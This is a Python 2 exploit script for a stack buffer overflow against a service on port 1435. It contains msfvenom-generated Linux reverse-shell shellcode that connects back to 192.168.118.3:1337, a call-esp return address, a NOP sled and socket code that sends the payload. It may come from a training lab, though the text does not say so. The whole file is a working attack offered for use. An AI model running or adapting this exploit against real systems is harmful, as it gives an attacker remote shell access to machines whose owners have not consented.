#!/usr/bin/python

import socket
import sys
import struct
import time
import os

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.3 LPORT=1337 -f py -b "\x00"

buf =  b""
buf += b"\xbb\x3d\xb1\x80\xc7\xdb\xd1\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x1f\x31\x5a\x15\x83\xea\xfc\x03\x5a\x11\xe2"
buf += b"\xc8\xdb\x8a\x99\x03\xc7\x7c\xc6\x30\xb4\xd1\x63\xb4"
buf += b"\x8a\xb0\xfa\x59\x27\xbc\x6a\xc2\xd0\x7d\x3c\xc5\xbb"
buf += b"\x16\x3f\x25\xa9\x55\xb6\xc4\xbb\xff\x91\x56\x6d\x57"
buf += b"\xab\xb7\xce\x9a\x2b\xb2\x11\x5d\x35\xf2\xe5\xa3\x2d"
buf += b"\xa8\x06\xdc\xad\xf4\x6c\xdc\xc7\x01\xf8\x3f\x26\xc0"
buf += b"\x37\x3f\xcc\x12\xbe\xfd\x24\xb5\xf3\xf9\x03\xb9\xe3"
buf += b"\x05\x74\x30\xe0\xc7\x9f\x4e\x26\x24\x53\xfe\xd5\x66"
buf += b"\xec\x7b\xe5\x01\xfd\xd8\x6f\x10\x64\x6c\x05\x63\x94"
buf += b"\x5d\x5a\x06\x5b\x25\x59\xf6\xbd\x6d\x5c\x08\x3e\x8d"
buf += b"\xe4\x09\x3e\x8d\x1a\xc7\xbe"

callesp = struct.pack("<I", 0x52501513)
host = sys.argv[1]
buffer = "A" * 13 + callesp + "\x90" * 20 + buf + "\x00"

k = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
       k.connect((host, 1435))
       print "[*] The program has successfully connected to the server."
       print "[+] Sending our payload...this will take a minute"
except:
       print "[!] The program didn't recieve a response from the target."
       sys.exit(1)

k.send("%s\r\n" %buffer)

k.close()
